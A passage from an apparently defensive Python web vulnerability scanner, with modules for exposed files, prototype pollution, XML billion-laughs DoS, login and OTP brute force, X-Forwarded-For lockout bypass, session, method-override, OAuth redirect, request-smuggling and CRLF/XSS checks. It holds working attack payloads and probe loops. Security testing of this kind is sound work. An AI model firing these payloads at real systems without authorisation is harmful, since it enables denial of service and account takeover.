                            "Review all Disallowed paths in robots.txt for sensitive content. "
                            "robots.txt is public — do not use it to hide sensitive endpoints.",
                            confidence="low")
                    continue

                if path == "/.well-known/security.txt":
                    yield _finding("info_disclosure", "security_txt_present", "info",
                        "security.txt Found",
                        f"Security policy file at {url} is present. Contains contact info for reporting vulnerabilities.",
                        f"URL: {url}\nContent: {body[:200]}",
                        url, False,
                        "Good security practice. Ensure the contact information is current.",
                        confidence="low")
                    continue

                # Generic: sensitive file accessible
                indicators = INFO_DISCLOSURE_INDICATORS.get(path, [])
                if indicators and any(ind in body for ind in indicators):
                    yield _finding("info_disclosure", "sensitive_file_exposed", "high",
                        f"Sensitive File Exposed: {path}",
                        f"File at {url} is publicly accessible and contains sensitive data.",
                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
                        url, True,
                        "Remove sensitive files from the web root. Use deployment pipelines "
                        "to prevent secrets and config files from being deployed publicly.",
                        confidence="medium")

            elif r.status_code == 403:
                # 403 means the file exists but is blocked — still worth noting for critical paths
                if path in ("/.env", "/.git/config", "/.htpasswd"):
                    yield _finding("info_disclosure", "sensitive_path_blocked", "info",
                        f"Sensitive Path Exists but Blocked: {path}",
                        f"GET {url} returned 403. The path exists — verify the block is complete "
                        f"(not bypassable via path traversal or method override).",
                        f"URL: {url}\nStatus: 403",
                        url, False,
                        "Ensure the block cannot be bypassed. Test with X-Original-URL, "
                        "X-Rewrite-URL, and path traversal variants.",
                        confidence="low")

        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test for specific Juice Shop files via direct GET
    juice_files = [
        ("/ftp/acquisitions.md", "confidential", "Acquisitions document found in /ftp"),
        ("/ftp/eastere.gg", "L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybWxoL2x3ZWo=", "Juice Shop Easter Egg file"),
        ("/ftp/coupons_2013.md.bak", "coupon", "Forgotten sales backup with coupon codes"),
        ("/ftp/package.json.bak", '"juiceshop"', "Developer forgot package.json backup in FTP"),
    ]
    for path, indicator, description in juice_files:
        try:
            r = await client.get(target + path, timeout=6)
            if r.status_code == 200 and (indicator in r.text or len(r.content) > 10):
                yield _finding("info_disclosure", "forgotten_file_" + path.split("/")[-1].replace(".", "_"),
                    "high", f"Forgotten File Exposed: {path}",
                    description + f". File is publicly accessible without authentication.",
                    f"URL: {target + path}\nSize: {len(r.content)} bytes\nPreview: {r.text[:200]}",
                    target + path, True,
                    "Remove all sensitive files from the /ftp and similar public directories. "
                    "Audit web-accessible directories regularly.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Insecure Deserialization ─────────────────────────────────────────

async def _module_deserialization(target: str, client: httpx.AsyncClient,
                                   forms: list[dict]) -> AsyncGenerator[dict, None]:
    """Test for insecure deserialization, prototype pollution, and zip/XML bombs."""

    # Test 1: Prototype pollution via JSON body
    prototype_test_endpoints = [
        "/api/users", "/api/register", "/api/v1/users",
        "/api/profile", "/api/settings",
        "/rest/user/login",
    ]
    for path in prototype_test_endpoints[:4]:
        url = target + path
        for payload in PROTOTYPE_POLLUTION_PAYLOADS[:3]:
            if not isinstance(payload, dict):
                continue
            try:
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if isinstance(data, dict):
                            if data.get("isAdmin") or data.get("role") == "admin" or data.get("admin"):
                                yield _finding("deserialization", "prototype_pollution_admin", "critical",
                                    f"Prototype Pollution — Admin Privilege Escalation via {path}",
                                    f"POST {url} with `{payload}` returned admin=true or isAdmin=true. "
                                    f"Prototype pollution can overwrite global object properties.",
                                    f"URL: {url}\nPayload: {payload}\nResponse: {str(data)[:200]}",
                                    url, True,
                                    "Freeze Object.prototype in Node.js: `Object.freeze(Object.prototype)`. "
                                    "Use JSON schema validation to reject __proto__ keys.",
                                    confidence="medium")
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test 2: Prototype pollution via URL query params
    for path in prototype_test_endpoints[:2]:
        url = target + path
        for pp_param in PROTOTYPE_POLLUTION_PAYLOADS:
            if isinstance(pp_param, str):
                try:
                    r = await client.get(f"{url}?{pp_param}", timeout=6)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, dict) and (data.get("isAdmin") or data.get("role") == "admin"):
                                yield _finding("deserialization", "prototype_pollution_url", "high",
                                    "Prototype Pollution via URL Query Parameter",
                                    f"URL query parameter `{pp_param}` caused prototype pollution. "
                                    f"Response indicates admin privileges were granted.",
                                    f"URL: {url}?{pp_param}\nResponse: {str(data)[:200]}",
                                    url, True,
                                    "Sanitize URL query parameters. Reject keys containing __proto__ or constructor.",
                                    confidence="medium")
                        except Exception:
                            pass
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)

    # Test 3: XML billion laughs via B2B endpoint
    billion_laughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>"""
    b2b_url = target + "/b2b/v2/orders"
    try:
        r = await asyncio.wait_for(
            client.post(b2b_url,
                content=billion_laughs.encode(),
                headers={"Content-Type": "application/xml"}),
            timeout=3.0
        )
        # Same fix as the CSRF content-type-bypass check above: a correct
        # 401/403 auth rejection must not count as "endpoint may accept this".
        if r.status_code not in (401, 403, 404, 405, 501):
            yield _finding("deserialization", "xml_billion_laughs_endpoint", "high",
                "B2B Endpoint May Accept Billion Laughs XML DoS",
                f"POST {b2b_url} returned {r.status_code} for XML input. "
                f"If the XML parser processes entity expansion, a billion laughs attack "
                f"can cause CPU/memory exhaustion.",
                f"URL: {b2b_url}\nStatus: {r.status_code}",
                b2b_url, True,
                "Set entity expansion limits in XML parser. "
                "Use FEATURE_SECURE_PROCESSING in Java. Limit entity depth to 1-2 levels.",
                confidence="low", oracle="bare-signal")
    except asyncio.TimeoutError:
        # Timeout means the server hung processing the entity expansion
        yield _finding("deserialization", "xml_dos_confirmed", "critical",
            "XML DoS (Billion Laughs) Confirmed at B2B Endpoint",
            f"POST {b2b_url} with billion laughs XML payload caused the server to hang "
            f"(no response within 3s). CPU/memory exhaustion DoS is exploitable.",
            f"URL: {b2b_url}\nPayload: XML with 4-level entity expansion\n"
            f"Evidence: Server did not respond within 3 seconds",
            b2b_url, True,
            "Disable entity expansion in XML parser. Set expansion limit to 1. "
            "Use XMLConstants.FEATURE_SECURE_PROCESSING.",
            confidence="high", oracle="timing")
    except Exception:
        pass


# ── Module: Rate Limiting / Brute Force Protection ────────────────────────────

async def _module_rate_limit(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test brute-force protection on login, password reset, and OTP endpoints."""

    # Discover login endpoint
    login_candidates = [
        ("/rest/user/login", "email", "password"),
        ("/api/auth/login", "email", "password"),
        ("/api/login", "username", "password"),
        ("/api/v1/auth/login", "email", "password"),
        ("/login", "username", "password"),
    ]
    login_url = None
    user_field = "email"
    pass_field = "password"

    for path, uf, pf in login_candidates:
        url = target + path
        try:
            r = await client.post(url, json={uf: "probe@test.com", pf: "wrongpass"}, timeout=5)
            if r.status_code not in (404, 405):
                login_url = url
                user_field = uf
                pass_field = pf
                break
        except httpx.HTTPError:
            continue

    if login_url:
        # ── Test 1: Login brute force — 10 rapid attempts ────────────────────
        blocked = False
        last_status = 0
        for i in range(10):
            try:
                r = await client.post(login_url,
                    json={user_field: "admin@example.com", pass_field: f"wrongpass{i}"},
                    timeout=5)
                last_status = r.status_code
                if r.status_code in (429, 423, 403) or "rate" in r.text.lower() or "locked" in r.text.lower():
                    blocked = True
                    break
            except httpx.HTTPError:
                break
            await asyncio.sleep(0.05)

        if not blocked:
            yield _finding("rate_limit", "no_login_lockout", "high",
                "No Brute Force Protection on Login",
                f"10 consecutive failed login attempts to {login_url} were not rate-limited "
                f"(last status: {last_status}). Passwords can be brute-forced without restriction.",
                f"Endpoint: {login_url}\n10 attempts — no 429/423/403 response",
                login_url, True,
                "Implement account lockout after 5-10 failed attempts. "
                "Add exponential backoff or CAPTCHA. Use IP-based rate limiting.",
                confidence="high")
        else:
            yield _finding("rate_limit", "login_lockout_active", "info",
                "Brute Force Protection Active on Login",
                f"Login endpoint rate-limits after {i+1} attempt(s) (status: {last_status}).",
                f"Endpoint: {login_url}\nBlocked after {i+1} attempts",
                login_url, False,
                "Rate limiting is working. Verify the threshold and ensure it applies per-IP and per-account.",
                confidence="high")

        # ── Test 2: Check if X-Forwarded-For bypasses rate limiting ─────────
        # Reset by spoofing IP — some apps rate-limit by IP but trust X-Forwarded-For
        spoofed_blocked = False
        for i in range(6):
            try:
                r = await client.post(login_url,
                    json={user_field: "admin@example.com", pass_field: f"wrongpass{i}"},
                    headers={"X-Forwarded-For": f"1.2.3.{i}", "X-Real-IP": f"1.2.3.{i}"},
                    timeout=5)
                if r.status_code in (429, 423):
                    spoofed_blocked = True
                    break
            except httpx.HTTPError:
                break
            await asyncio.sleep(0.05)

        if not spoofed_blocked and blocked:
            yield _finding("rate_limit", "xff_rate_limit_bypass", "high",
                "Rate Limiting Bypassed via X-Forwarded-For Header",
                "Login rate limiting can be bypassed by rotating the X-Forwarded-For header. "
                "Attacker can send unlimited login attempts by changing the spoofed IP.",
                f"Endpoint: {login_url}\nX-Forwarded-For rotation bypasses lockout",
                login_url, True,
                "Never use X-Forwarded-For for rate limiting decisions unless behind a trusted proxy. "
                "Rate limit by both account identity AND real connection IP.",
                confidence="medium")

    # ── Test 3: Password reset throttling ────────────────────────────────────
    reset_candidates = ["/api/forgot-password", "/rest/user/reset-password", "/forgot-password", "/api/auth/forgot-password"]
    for path in reset_candidates:
        url = target + path
        try:
            responses = []
            for i in range(5):
                r = await client.post(url, json={"email": f"test{i}@test.com"}, timeout=5)
                responses.append(r.status_code)
                await asyncio.sleep(0.1)
            if all(s not in (429, 423) for s in responses) and any(s in (200, 201, 204) for s in responses):
                yield _finding("rate_limit", "reset_no_throttle", "medium",
                    "Password Reset Not Throttled",
                    f"5 password reset requests to {url} were not rate-limited. "
                    f"Attacker can flood users with reset emails or enumerate valid accounts.",
                    f"Endpoint: {url}\nAll 5 requests returned: {responses}",
                    url, True,
                    "Rate-limit password reset requests per email address and per IP. "
                    "Return identical responses for valid/invalid emails (prevent enumeration).",
                    confidence="medium")
                break
        except httpx.HTTPError:
            continue
        await asyncio.sleep(0)


# ── Module: Session Management ────────────────────────────────────────────────

async def _module_session(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test session security: fixation, cookie flags, concurrent sessions, logout."""

    yield _probe("session", "GET", target, note="checking session cookie flags")
    try:
        r = await client.get(target, timeout=8)
        yield _probe("session", "GET", target, status=r.status_code,
                     note=f"Set-Cookie headers: {sum(1 for k,_ in r.headers.multi_items() if k.lower()=='set-cookie')}")
    except httpx.HTTPError:
        return

    # ── Test 1: Cookie security flags ────────────────────────────────────────
    cookie_headers = []
    # httpx stores set-cookie as a single header per cookie
    for header_name, header_val in r.headers.multi_items():
        if header_name.lower() == "set-cookie":
            cookie_headers.append(header_val)

    for cookie_str in cookie_headers:
        cookie_lower = cookie_str.lower()
        name = cookie_str.split("=")[0].strip()

        # Only check session-like cookies
        if not any(kw in name.lower() for kw in ["session", "token", "auth", "jwt", "sid", "user"]):
            continue

        if "httponly" not in cookie_lower:
            yield _finding("session", "cookie_no_httponly", "medium",
                f"Session Cookie '{name}' Missing HttpOnly Flag",
                f"Cookie `{name}` is accessible via JavaScript (no HttpOnly). "
                f"XSS attacks can steal this cookie.",
                f"Set-Cookie: {cookie_str[:200]}",
                target, True,
                "Add HttpOnly flag to all session cookies: Set-Cookie: name=value; HttpOnly",
                confidence="high")

        if "secure" not in cookie_lower:
            yield _finding("session", "cookie_no_secure", "medium",
                f"Session Cookie '{name}' Missing Secure Flag",
                f"Cookie `{name}` is transmitted over HTTP (no Secure flag). "
                f"Network attackers can capture this cookie.",
                f"Set-Cookie: {cookie_str[:200]}",
                target, True,
                "Add Secure flag to all session cookies: Set-Cookie: name=value; Secure",
                confidence="high")

        if "samesite" not in cookie_lower:
            yield _finding("session", "cookie_no_samesite", "low",
                f"Session Cookie '{name}' Missing SameSite Attribute",
                f"Cookie `{name}` has no SameSite attribute. "
                f"Default varies by browser — CSRF attacks may be possible.",
                f"Set-Cookie: {cookie_str[:200]}",
                target, True,
                "Set SameSite=Lax or SameSite=Strict on all session cookies.",
                confidence="medium")

    # ── Test 2: Session fixation ──────────────────────────────────────────────
    # Capture session ID before login — if it stays the same after login, fixation is possible
    pre_login_session = None
    for cookie_name, cookie_val in r.cookies.items():
        if any(kw in cookie_name.lower() for kw in ["session", "sid"]):
            pre_login_session = (cookie_name, cookie_val)
            break

    if pre_login_session:
        # Attempt login with the pre-existing session
        login_paths = ["/api/login", "/rest/user/login", "/api/auth/login"]
        for path in login_paths:
            try:
                lr = await client.post(target + path,
                    json={"email": "test@test.com", "password": "test"},
                    timeout=6)
                if lr.status_code < 400:
                    post_session = lr.cookies.get(pre_login_session[0])
                    if post_session and post_session == pre_login_session[1]:
                        yield _finding("session", "session_fixation", "high",
                            "Session Fixation — Session ID Not Regenerated After Login",
                            f"Session ID `{pre_login_session[0]}` is the same before and after login. "
                            f"Attacker can fix a session ID and wait for victim to authenticate.",
                            f"Pre-login: {pre_login_session[1][:20]}...\nPost-login: {post_session[:20]}...",
                            target + path, True,
                            "Always generate a new session ID after successful authentication. "
                            "Invalidate the old session immediately.",
                            confidence="medium")
                    break
            except httpx.HTTPError:
                continue

    # ── Test 3: Logout endpoint — verify session invalidation ─────────────────
    logout_paths = ["/api/logout", "/rest/user/logout", "/logout", "/api/auth/logout"]
    for path in logout_paths:
        url = target + path
        try:
            r_out = await client.post(url, timeout=6)
            if r_out.status_code in (200, 204):
                # Check if the old session still works after logout
                r_check = await client.get(target + "/api/me", timeout=6)
                if r_check.status_code == 200 and len(r_check.text) > 30:
                    yield _finding("session", "session_not_invalidated", "high",
                        "Session Not Invalidated After Logout",
                        f"After calling {path} (status {r_out.status_code}), the session cookie "
                        f"still returns data from /api/me. Server is not invalidating sessions.",
                        f"Logout: {url}\n/api/me after logout: {r_check.status_code}",
                        url, True,
                        "Invalidate the server-side session token on logout. "
                        "Do not rely on client-side cookie deletion.",
                        confidence="medium")
                break
        except httpx.HTTPError:
            continue
        await asyncio.sleep(0)


# ── Module: HTTP Method Tampering ─────────────────────────────────────────────

async def _module_http_method(target: str, client: httpx.AsyncClient,
                               endpoints: set[str],
                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """Test HTTP method tampering: verb tunneling, method override, unexpected methods."""

    test_paths = list(endpoints)[:15] + [
        target + "/api/users/1",
        target + "/api/me",
        target + "/api/admin",
        target + "/api/config",
    ]

    for url in test_paths[:12]:
        # ── Test 1: GET endpoint accessible via DELETE/PUT ────────────────────
        try:
            r_get = await client.get(url, timeout=6)
            if _is_spa_fallback(r_get, spa_fallback_size) or r_get.status_code == 404:
                continue

            for method in ["DELETE", "PUT", "PATCH"]:
                try:
                    r_method = await client.request(method, url,
                        json={"test": "attacktrace"}, timeout=6)
                    if r_method.status_code in (200, 201, 204):
                        yield _finding("http_method", f"unintended_{method.lower()}", "high",
                            f"HTTP {method} Accepted on {url.replace(target, '')}",
                            f"Endpoint {url} accepted {method} request (status {r_method.status_code}) "
                            f"when only GET is expected. Unintended state modification may be possible.",
                            f"GET: {r_get.status_code} | {method}: {r_method.status_code}\nURL: {url}",
                            url, True,
                            f"Restrict HTTP methods per endpoint. Return 405 Method Not Allowed "
                            f"for unexpected methods. Use explicit method routing.",
                            confidence="medium")
                        break
                except httpx.HTTPError:
                    pass
        except httpx.HTTPError:
            continue
        await asyncio.sleep(0)

    # ── Test 2: X-HTTP-Method-Override to tunnel DELETE through POST ──────────
    method_override_endpoints = [target + "/api/users/1", target + "/api/me", target + "/api/admin/users/1"]
    for url in method_override_endpoints:
        try:
            r_direct = await client.delete(url, timeout=6)
            # If direct DELETE is blocked (405/403/401), try override
            if r_direct.status_code in (405, 403, 401):
                for override_header in ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"]:
                    r_override = await client.post(url,
                        headers={override_header: "DELETE"},
                        json={}, timeout=6)
                    if r_override.status_code in (200, 201, 204) and r_override.status_code != r_direct.status_code:
                        yield _finding("http_method", "method_override_bypass", "high",
                            f"HTTP Method Override Bypasses Access Control ({override_header})",
                            f"Direct DELETE on {url} returns {r_direct.status_code}, but POST with "
                            f"`{override_header}: DELETE` returns {r_override.status_code}. "
                            f"Method restrictions are bypassable via override header.",
                            f"URL: {url}\nDirect DELETE: {r_direct.status_code}\n"
                            f"{override_header}: DELETE via POST: {r_override.status_code}",
                            url, True,
                            "Ignore X-HTTP-Method-Override headers if not explicitly needed. "
                            "If used, validate override is allowed for the endpoint.",
                            confidence="high")
                        break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 3: TRACE method detection ────────────────────────────────────────
    try:
        r_trace = await client.request("TRACE", target, timeout=6)
        if r_trace.status_code == 200 and "TRACE" in r_trace.text.upper():
            yield _finding("http_method", "trace_enabled", "low",
                "HTTP TRACE Method Enabled",
                "TRACE method is enabled. Can be combined with XSS for Cross-Site Tracing (XST) "
                "to steal HttpOnly cookies in older browsers.",
                f"TRACE / → {r_trace.status_code}\nBody: {r_trace.text[:200]}",
                target, True,
                "Disable TRACE method in web server configuration.",
                confidence="high")
    except httpx.HTTPError:
        pass


# ── Module: 2FA / MFA Bypass ──────────────────────────────────────────────────

async def _module_2fa_bypass(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test 2FA/MFA bypass techniques: null code, code reuse, response manipulation."""

    otp_paths = [
        "/api/2fa/verify", "/api/mfa/verify", "/api/otp/verify",
        "/api/auth/2fa", "/api/auth/otp", "/2fa/verify", "/verify-otp",
        "/api/v1/2fa/verify", "/api/totp/verify",
    ]

    active_otp_url = None
    for path in otp_paths:
        url = target + path
        try:
            r = await client.post(url, json={"otp": "123456"}, timeout=5)
            if r.status_code not in (404, 405):
                active_otp_url = url
                break
        except httpx.HTTPError:
            continue

    if not active_otp_url:
        return

    # ── Test 1: Null/empty OTP ────────────────────────────────────────────────
    for null_code in ["", "null", "0", "000000", None]:
        try:
            r = await client.post(active_otp_url, json={"otp": null_code}, timeout=6)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    if any(k in str(data) for k in ["token", "authenticated", "success", "verified"]):
                        yield _finding("2fa_bypass", "null_otp_accepted", "critical",
                            f"2FA Bypass — Null/Empty OTP Code Accepted",
                            f"POST {active_otp_url} with OTP=`{null_code}` returned authentication "
                            f"success. 2FA is trivially bypassable.",
                            f"Endpoint: {active_otp_url}\nOTP: {null_code}\nResponse: {str(data)[:200]}",
                            active_otp_url, True,
                            "Validate OTP values server-side — reject empty, null, or zero values. "
                            "Implement a TOTP library with proper validation.",
                            confidence="high")
                        break
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: 2FA rate limiting (OTP brute force) ───────────────────────────
    blocked = False
    for i in range(8):
        otp = f"{i:06d}"
        try:
            r = await client.post(active_otp_url, json={"otp": otp}, timeout=5)
            if r.status_code in (429, 423, 403) or "rate" in r.text.lower() or "locked" in r.text.lower():
                blocked = True
                break
        except httpx.HTTPError:
            break
        await asyncio.sleep(0.05)

    if not blocked:
        yield _finding("2fa_bypass", "otp_no_rate_limit", "high",
            "2FA OTP Not Rate-Limited — Brute Force Possible",
            f"8 consecutive OTP submissions to {active_otp_url} were not blocked. "
            f"6-digit TOTP has 1,000,000 combinations — brute-forceable without rate limiting.",
            f"Endpoint: {active_otp_url}\n8 attempts — no 429 response",
            active_otp_url, True,
            "Rate limit OTP verification to 3-5 attempts before locking the session. "
            "Implement a time window (e.g. 1 OTP attempt per 30 seconds).",
            confidence="high")

    # ── Test 3: OTP step skipping ─────────────────────────────────────────────
    # Try to access authenticated resources without completing 2FA step
    protected_paths = ["/api/me", "/api/user", "/api/dashboard", "/api/profile"]
    for path in protected_paths[:2]:
        try:
            r = await client.get(target + path, timeout=6)
            if r.status_code == 200 and len(r.text) > 50:
                try:
                    data = r.json()
                    if any(k in data for k in ["email", "id", "username", "role"]):
                        yield _finding("2fa_bypass", "otp_step_skip", "critical",
                            "2FA Step Bypass — Authenticated Resource Accessible Without OTP",
                            f"GET {target + path} returns user data without completing the 2FA challenge. "
                            f"The 2FA check is enforced only at login, not at resource access.",
                            f"Endpoint: {target + path}\nStatus: 200\nData keys: {list(data.keys())[:5]}",
                            target + path, True,
                            "Enforce 2FA completion at the session level, not just the login step. "
                            "Mark sessions as 'pending_mfa' and reject requests until OTP is verified.",
                            confidence="medium")
                        break
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: OAuth Misconfiguration ────────────────────────────────────────────

async def _module_oauth(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test OAuth 2.0 misconfigurations: open redirect, missing state, PKCE bypass."""

    # Discover OAuth endpoints
    oauth_paths = [
        "/oauth/authorize", "/api/oauth/authorize", "/auth/oauth/authorize",
        "/connect/authorize", "/api/connect/authorize",
        "/oauth2/authorize", "/.well-known/openid-configuration",
    ]

    oauth_base = None
    for path in oauth_paths:
        try:
            r = await client.get(target + path, timeout=6, follow_redirects=False)
            if r.status_code in (200, 302, 400):  # 400 = exists but missing params
                oauth_base = target + path
                break
        except httpx.HTTPError:
            continue

    if oauth_base:
        # ── Test 1: Open redirect in redirect_uri ─────────────────────────────
        evil_redirect = "https://evil.example.com/callback"
        try:
            r = await client.get(oauth_base,
                params={
                    "response_type": "code",
                    "client_id": "test",
                    "redirect_uri": evil_redirect,
                    "state": "teststate",
                },
                follow_redirects=False, timeout=8)
            loc = r.headers.get("location", "")
            if "evil.example.com" in loc:
                yield _finding("oauth", "oauth_open_redirect", "critical",
                    "OAuth Open Redirect — Attacker-Controlled redirect_uri Accepted",
                    f"OAuth authorize endpoint accepted `redirect_uri={evil_redirect}`. "
                    f"Attacker can steal authorization codes by redirecting victims to their server.",
                    f"URL: {oauth_base}\nredirect_uri: {evil_redirect}\nLocation: {loc}",
                    oauth_base, True,
                    "Enforce a strict allowlist of registered redirect URIs. "
                    "Reject any redirect_uri not exactly matching a pre-registered value.",
                    confidence="high")
        except httpx.HTTPError:
            pass

        # ── Test 2: Missing state parameter validation ─────────────────────────
        try:
            r_no_state = await client.get(oauth_base,
                params={"response_type": "code", "client_id": "test", "redirect_uri": target + "/callback"},
                follow_redirects=False, timeout=8)
            if r_no_state.status_code in (200, 302) and "error" not in r_no_state.headers.get("location", "").lower():
                yield _finding("oauth", "oauth_missing_state", "medium",
                    "OAuth Authorization Without State Parameter Accepted",
                    "OAuth authorize request without `state` parameter was accepted. "
                    "Missing state enables CSRF attacks against the OAuth flow.",
                    f"URL: {oauth_base}\nNo state parameter — status: {r_no_state.status_code}",
                    oauth_base, True,
                    "Require the `state` parameter. Verify state value matches the stored value before "
                    "exchanging the authorization code.",
                    confidence="medium")
        except httpx.HTTPError:
            pass

    # ── Test 3: Token endpoint security ──────────────────────────────────────
    token_paths = ["/oauth/token", "/api/oauth/token", "/connect/token", "/oauth2/token"]
    for path in token_paths:
        url = target + path
        try:
            # Try client credentials without authentication
            r = await client.post(url,
                data={"grant_type": "client_credentials", "client_id": "test", "client_secret": "test"},
                timeout=6)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    if "access_token" in data:
                        yield _finding("oauth", "oauth_weak_client_auth", "high",
                            "OAuth Token Issued with Test Credentials",
                            f"POST {url} with client_id=test/client_secret=test returned an access token. "
                            f"OAuth server may not be validating client credentials.",
                            f"Response: {str(data)[:200]}",
                            url, True,
                            "Validate client credentials against a secure registry. "
                            "Never accept test or default client IDs in production.",
                            confidence="medium")
                        break
                except Exception:
                    pass
        except httpx.HTTPError:
            continue
        await asyncio.sleep(0)


# ── Module: HTTP Request Smuggling ───────────────────────────────────────────

async def _module_smuggling(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Detect HTTP request smuggling: CL.TE, TE.CL, CL.0 via timing/response divergence."""
    import socket

    parsed = urlparse(target)
    host = parsed.hostname or ""
    port = 443 if parsed.scheme == "https" else 80

    # ── Test 1: TE header obfuscation fingerprint ─────────────────────────────
    # Servers that ignore TE obfuscation may be vulnerable to TE.CL smuggling
    obfuscated_te_headers = [
        {"Transfer-Encoding": "xchunked"},
        {"Transfer-Encoding": " chunked"},   # leading space
        {"Transfer-Encoding": "chunked, identity"},
        {"Transfer-Encoding": "identity\r\nTransfer-Encoding: chunked"},
    ]
    for extra_headers in obfuscated_te_headers:
        try:
            r = await client.post(target, headers=extra_headers, content=b"0\r\n\r\n", timeout=6)
            if r.status_code not in (400, 501):
                yield _finding("smuggling", "te_obfuscation_accepted", "high",
                    "HTTP Transfer-Encoding Obfuscation Not Rejected",
                    f"Server accepted a malformed `Transfer-Encoding` header "
                    f"(`{list(extra_headers.values())[0]}`) without returning 400. "
                    f"This is a pre-condition for TE.CL or CL.TE request smuggling. "
                    f"An attacker could desync the front-end/back-end connection to poison "
                    f"other users' requests, bypass access controls, or steal credentials.",
                    f"TE header: {list(extra_headers.values())[0]}\nStatus: {r.status_code}",
                    target, True,
                    "Reject requests with unrecognised or duplicate Transfer-Encoding values. "
                    "Ensure the reverse proxy and origin server agree on which header takes precedence.",
                    confidence="medium")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: CL.0 — zero Content-Length with body ─────────────────────────
    # Some servers ignore Content-Length:0 and process body anyway
    try:
        r1 = await client.post(target, headers={"Content-Length": "0"},
                               content=b"GET /smuggled HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n",
                               timeout=8)
        r2 = await client.get(target + "/smuggled", timeout=6)
        if r2.status_code in (200, 301, 302):
            yield _finding("smuggling", "cl_zero_desync", "high",
                "Possible CL.0 Request Smuggling — Unexpected Response to Smuggled Path",
                f"Sent a POST with Content-Length:0 containing a smuggled `GET /smuggled` prefix. "
                f"The follow-up request to `/smuggled` returned {r2.status_code}, suggesting the "
                f"backend may have processed the smuggled path. Manual verification required.",
                f"POST / with CL:0 + smuggled body → follow-up /smuggled: {r2.status_code}",
                target, True,
                "Ensure all layers (reverse proxy, CDN, origin) agree on Content-Length handling. "
                "Disable request body parsing on endpoints that don't require it.",
                confidence="low")
    except httpx.HTTPError:
        pass

    # ── Test 3: Timing oracle for CL.TE ──────────────────────────────────────
    # If front-end uses CL and backend uses TE, backend waits for final chunk indefinitely
    try:
        t0 = time.monotonic()
        await client.post(
            target,
            headers={"Content-Length": "4", "Transfer-Encoding": "chunked"},
            content=b"1\r\nZ\r\n",   # incomplete chunked body — only 1 chunk, no terminating 0
            timeout=6,
        )
        elapsed = time.monotonic() - t0
        if elapsed >= 5.5:
            yield _finding("smuggling", "cl_te_timing", "high",
                "HTTP Smuggling Timing Oracle — Possible CL.TE Desync",
                f"A POST with conflicting `Content-Length: 4` and `Transfer-Encoding: chunked` "
                f"with an incomplete chunked body caused a {elapsed:.1f}s delay. "
                f"This timing pattern is consistent with CL.TE request smuggling where the back-end "
                f"waits for the terminal chunk that never arrives.",
                f"CL:4 + TE:chunked + incomplete body → {elapsed:.1f}s response time",
                target, True,
                "Normalize request handling across all proxy layers. Configure the front-end to "
                "always use Transfer-Encoding when present, or reject ambiguous requests.",
                confidence="medium")
    except (httpx.TimeoutException, httpx.HTTPError):
        pass


# ── Module: CRLF Injection ────────────────────────────────────────────────────

async def _module_crlf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Detect CRLF injection in URL parameters → header injection, response splitting, XSS past CSP."""

    crlf_payloads = [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected: crlf-test",
        "%0d%0a%20X-Injected: crlf-test",
        "%r%nX-Injected: crlf-test",
        "%%0d%%0aX-Injected: crlf-test",
        "%E5%98%8D%E5%98%8AX-Injected: crlf-test",  # UTF-8 encoded CRLF
    ]
    # XSS via response splitting (injects body after headers)
    xss_payloads = [
        "%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert(document.domain)</script>",
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
    ]

    probe_params = ["redirect", "url", "return", "next", "continue", "goto", "path", "q", "search", "lang"]

    for param in probe_params[:5]:
        for payload in crlf_payloads:
            url = f"{target}?{param}={payload}"
            try:
                r = await client.get(url, follow_redirects=False, timeout=7)
                if "x-injected" in r.headers or "crlf-test" in str(r.headers).lower():
                    yield _finding("crlf", "crlf_header_injection", "high",
                        f"CRLF Injection — Header Injection via `{param}` Parameter",
                        f"The response contains an injected `X-Injected: crlf-test` header via the "
                        f"`{param}` parameter. An attacker can inject arbitrary headers, split the "
                        f"HTTP response, and inject scripts that bypass `Content-Security-Policy: "
                        f"script-src 'self'` because the injected script lives in the same response.",
                        f"URL: {url}\nInjected header detected in response",
                        url, True,
                        "Validate and encode all user input before using it in HTTP response headers. "
                        "Reject \\r and \\n characters in redirect targets and header values.",
                        confidence="high")
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── XSS via response splitting ────────────────────────────────────────────
    for param in probe_params[:3]:
        for payload in xss_payloads:
            url = f"{target}?{param}={payload}"
            try:
